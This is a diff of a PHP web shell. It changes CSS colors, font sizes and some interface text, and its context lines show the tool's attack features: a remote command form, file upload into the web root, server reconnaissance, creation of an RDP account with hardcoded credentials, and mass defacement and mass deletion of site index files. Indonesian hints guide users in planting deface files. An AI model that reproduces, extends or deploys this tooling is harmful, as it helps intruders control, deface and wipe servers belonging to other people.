@@ -27,24 +27,24 @@ if(version_compare(PHP_VERSION, '5.3.0', '<')) {
 @import url(https://fonts.googleapis.com/css2?family=Kelly+Slab);
 
 *, body, html{cursor: url(http://cur.cursors-4u.net/cursors/cur-9/cur863.ani), url(http://cur.cursors-4u.net/cursors/cur-9/cur863.png), default !important;}
-html {background: #111111;color: #ffffff;font-family: 'Kelly Slab';font-size: 15px;width: 100%;margin-left:auto;margin-right:auto;}
+html {background: #111111;color: #ffffff;font-family: 'Kelly Slab';font-size: 16px;width: 100%;margin-left:auto;margin-right:auto;}
 li {display: inline;margin: 5px;padding: 0px;}
-table, th, td {border-collapse:collapse;font-family: Tahoma, Geneva, sans-serif;background: transparent;font-family: 'Kelly Slab';font-size: 15px;}
+table, th, td {border-collapse:collapse;font-family: Tahoma, Geneva, sans-serif;background: transparent;font-family: 'Kelly Slab';font-size: 16px;}
 .table_home, .th_home, .td_home {border: 1px solid #ffffff;}
-.table_home tr:hover {background-color: green;}
-.th_home tr:hover{background-color: #1a1a1a;}
+.table_home tr:hover {background-color: #464646;}
+.th_home tr:hover{background-color: #464646;}
 .wenk{color: #00bfff;}
 th {padding: 10px;}
 a {color: #ffffff;text-decoration: none;}
-a:hover {color: gold;text-decoration: underline;color: #00ff00;text-decoration: none;}
-#tangina:hover{ background-color: #1a1a1a; }
-b {color: gold;}
+a:hover {color: yellow;text-decoration: underline;color: #00ff00;text-decoration: none;}
+#tangina:hover{ background-color: #464646; }
+b {color: yellow;}
 input[type=text], input[type=password],input[type=submit] {background: transparent;color: #ffffff;border: 1px solid #ffffff;margin: 5px auto;padding-left: 5px;
-    font-family: 'Kelly Slab';font-size: 15px;}
-textarea {border: 1px solid #ffffff;width: 100%;height: 400px;padding-left: 5px;margin: 10px auto;resize: none;background: transparent;color: #ffffff;font-family: 'Kelly Slab';font-size: 15px;}
-select {background: transparent;color: #ffffff;border: 1px solid #ffffff;margin: 5px auto;padding-left: 5px;font-family: 'Kelly Slab';font-size: 15px;}
-.but {background: transparent;color: #ffffff;border: 1px solid #ffffff;margin: 5px auto;padding-left: 5px;font-family: 'Kelly Slab';font-size: 15px;}
-li a:hover{color: #00ff00;text-decoration: none;}
+    font-family: 'Kelly Slab';font-size: 16px;}
+textarea {border: 1px solid #ffffff;width: 100%;height: 400px;padding-left: 5px;margin: 10px auto;resize: none;background: transparent;color: #ffffff;font-family: 'Kelly Slab';font-size: 16px;}
+select {background: transparent;color: #ffffff;border: 1px solid #ffffff;margin: 5px auto;padding-left: 5px;font-family: 'Kelly Slab';font-size: 16px;}
+.but {background: transparent;color: #ffffff;border: 1px solid #ffffff;margin: 5px auto;padding-left: 5px;font-family: 'Kelly Slab';font-size: 16px;}
+li a:hover{color: yellow;text-decoration: none;}
 .th_home, .titulo {color: #00ff00;text-decoration: none;}
 .board {text-align: center;border: 1px solid rgba(255,180,0,0.4);border-radius: 4px;width: 500px;}
 .board p {font-size: 65px;font-family: 'Kelly Slab';color: #fff;text-transform: uppercase;padding: 0;margin: 0;}
@@ -56,7 +56,7 @@ li a:hover{color: #00ff00;text-decoration: none;}
 html {
     background: #1e1e1e;
 	color: #ffffff;
-	font-size: 15px;
+	font-size: 16px;
 	width: 99%;
 }
 
@@ -64,26 +64,26 @@ li {
 	display: inline;
 	margin: 5px;
 	padding: 5px;
+        color : #00bfff;
 }
 
 a {
-	color: #ffffff;
 	text-decoration: none;
 }
 
 a:hover {
-	color: gold;
+	color: yellow;
 	text-decoration: underline;
 }
 
 b {
-	color: gold;
+	color: yellow;
 }
 
 pre {
     font-family: 'Kelly Slab';
-    font-size: 15px;
-    border: 1px solid #ffc107;
+    font-size: 16px;
+    border: 1px solid yellow;
     padding: 5px;
 }
 
@@ -91,7 +91,7 @@ table, th, td {
 	border-collapse:collapse;
 	background: transparent;
 	font-family: 'Kelly Slab';
-	font-size: 15px;
+	font-size: 16px;
 }
 
 .table_home, .th_home, .td_home {
@@ -103,20 +103,19 @@ table, th, td {
 }
 
 .td_home, .td_home > a {
-	color: #ffffff;
+color: white;
 }
 
 .td_home > a:hover {
-	color: gold;
+	color: yellow;
 }
 
 th {
 	padding: 10px;
 }
 
-tr:hover {
-	background: #006400;
-	color: #ffffff;
+tr:hover td{
+background: #464646;
 }
 
 input[type=text], input[type=password], .input {
@@ -125,7 +124,7 @@ input[type=text], input[type=password], .input {
 	border: 1px solid #ffffff;
 	padding: 3px;
 	font-family: 'Kelly Slab';
-	font-size: 15px;
+	font-size: 16px;
 }
 
 input[type=submit] {
@@ -150,7 +149,7 @@ textarea {
 	background: transparent;
 	color: #ffffff;
 	font-family: 'Kelly Slab';
-	font-size: 15px;
+	font-size: 16px;
 }
 iframe {
 	width: 100%;
@@ -174,7 +173,7 @@ function color($bold = 1, $colorid = null, $string = null) {
 		$color = array(
 			"</font>",  			# 0 off
 			"<font color='red'>",	# 1 red 
-			"<font color='#00bfff'>",	# 2 #00bfff
+			"<font color='yellow'>",	# 2 yellow
 			"<font color='white'>",	# 3 white
 			"<font color='gold'>",	# 4 gold
 		);
@@ -417,15 +416,16 @@ function serverinfo() {
 	$disable_functions = @ini_get('disable_functions');
 	$disable_functions = (!empty($disable_functions)) ? color(1, 1, $disable_functions) : color(1, 2, "NONE");
 
-	$output[] = "SERVER IP ".color(1, 2, $GLOBALS['SERVERIP'])." / YOUR IP ".color(1, 2, $_SERVER['REMOTE_ADDR']);
+	$output[] = "SERVER IP     : ".color(1, 2, gethostbyname($_SERVER['SERVER_NAME']));
+	$output[] = "YOUR IP         : ".color(1, 2, $_SERVER['REMOTE_ADDR']);
 	$output[] = "WEB SERVER  : ".color(1, 2, $_SERVER['SERVER_SOFTWARE']);
-	$output[] = "SYSTEM      : ".color(1, 2, php_uname());
-	$output[] = "USER / GROUP: ".color(1, 2, usergroup()->name)."(".color(1, 2 , usergroup()->uid).") / ".color(1, 2 , usergroup()->group)."(".color(1, 2 , usergroup()->gid).")";
-	$output[] = "HDD         : ".color(1, 2, hdd()->used)." / ".color(1, 2 , hdd()->size)." (Free: ".color(1, 2 , hdd()->free).")";
+	$output[] = "SYSTEM         : ".color(1, 2, php_uname());
+	$output[] = "USER/GROUP  : ".color(1, 2, usergroup()->name)."(".color(1, 2 , usergroup()->uid).") / ".color(1, 2 , usergroup()->group)."(".color(1, 2 , usergroup()->gid).")";
+	$output[] = "HDD              : ".color(1, 2, hdd()->used)." / ".color(1, 2 , hdd()->size)." (Free: ".color(1, 2 , hdd()->free).")";
 	$output[] = "PHP VERSION : ".color(1, 2, @phpversion());
-	$output[] = "SAFE MODE   : ".(@ini_get(strtoupper("safe_mode")) === "ON" ? color(1, 2, "ON") : color(1, 2, "OFF"));
+	$output[] = "SAFE MODE    : ".(@ini_get(strtoupper("safe_mode")) === "ON" ? color(1, 2, "ON") : color(1, 2, "OFF"));
 	$output[] = lib_installed();
-	$output[] = "Current Dir (".writeable(path(), perms(path())).")";
+	$output[] = "Current Dir (".writeable(path(), perms(path())).") : ";
 
 	print "<pre>";
 	print implode("<br>", $output);
@@ -525,7 +525,7 @@ function massdelete($dir, $filename) {
 
 function tools($toolsname, $args = null) {
 	if($toolsname === "cmd") {
-		print "<form method='post' action='?do=cmd&dir=".path()."' style='margin-top: 15px;'>
+		print "<form method='post' action='?do=cmd&dir=".path()."' style='margin-top: 16px;'>
 			  ".usergroup()->name."@".$GLOBALS['SERVERIP'].": ~ $
 			  <input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='cmd' required>
 			  <input style='border: none; border-bottom: 1px solid #ffffff;' class='input' type='submit' value='>>'>
@@ -637,7 +637,7 @@ function tools($toolsname, $args = null) {
 		if($_POST['upload']) {
 			if($_POST['uploadtype'] === '1') {
 				if(@copy($_FILES['file']['tmp_name'], path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."")) {
-					$act = color(1, 2, "Uploaded!")." at <b>".path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."</b>";
+					$act = color(1, 4, "Uploaded!")." at ".path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."";
 				} 
 				else {
 					$act = color(1, 1, "Failed to upload file!");
@@ -648,7 +648,7 @@ function tools($toolsname, $args = null) {
 				$web = $_SERVER['HTTP_HOST'].DIRECTORY_SEPARATOR.$_FILES['file']['name'];
 				if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
 					if(@copy($_FILES['file']['tmp_name'], $root)) {
-						$act = color(1, 2, "Uploaded!")." at <b>$root -> </b><a href='http://$web' target='_blank'>$web</a>";
+						$act = color(1, 4, "Uploaded!")." at $root -> <a href='http://$web' target='_blank'>$web</a>";
 					} 
 					else {
 						$act = color(1, 1, "Failed to upload file!");
@@ -976,7 +976,7 @@ function tools($toolsname, $args = null) {
 
     	print "[ RDP ACCOUNT INFO ]<br>
     	------------------------------<br>
-    	IP: ".color(1, 2, $GLOBALS['SERVERIP'])."<br>
+    	IP: ".gethostbyname($_SERVER['SERVER_NAME'])."<br>
     	Username: ".color(1, 2, "mabang")."<br>
     	Password: ".color(1, 2, "mabang")."<br>
     	------------------------------<br><br>
@@ -1555,13 +1555,13 @@ function action() {
 				print "<center><form method='post'>
 					   <font style='text-decoration: underline;'>Tipe Mass:</font><br>
 					   <input type='radio' name='mass_type' value='singledir' checked>Mass Deface Single Directory<input type='radio' name='mass_type' value='alldir'>Mass Deface All Directory<input type='radio' name='mass_type' value='delete'>Mass Delete File<br>
-					   <span>( kosongkan 'Index File' jika memilih Mass Delete File )</span><br><br>
+					   <span>( leave 'Index File' blank if selecting Mass Delete File )</span><br><br>
 					   <font style='text-decoration: underline;'>Folder:</font><br>
 					   <input type='text' name='d_dir' value='".path()."' style='width: 450px;' height='10'><br><br>
 					   <font style='text-decoration: underline;'>Filename:</font><br>
 					   <input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br><br>
 					   <font style='text-decoration: underline;'>Index File:</font><br>
-					   <textarea name='script' style='width: 450px; height: 200px;'>Hacked by Unknown45</textarea><br>
+					   <textarea name='script' style='width: 450px; height: 200px;'></textarea><br>
 					   <input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 460px; margin: 5px auto;' type='submit' name='start' value='Mass'>
 					   </form></center>";
 			}
@@ -1598,7 +1598,7 @@ function action() {
 				print implode("\n", reverse());
 				print "</textarea><br>
 				<font style='text-decoration: underline;'>Index File:</font><br>
-				<textarea name='script' style='width: 450px; height: 200px;'>Hacked by Unknown45</textarea><br>
+				<textarea name='script' style='width: 450px; height: 200px;'></textarea><br>
 				<input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 460px; margin: 5px auto;' type='submit' name='reverse' value='Scan Fake Root!'>
 				</form><br>
 				NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
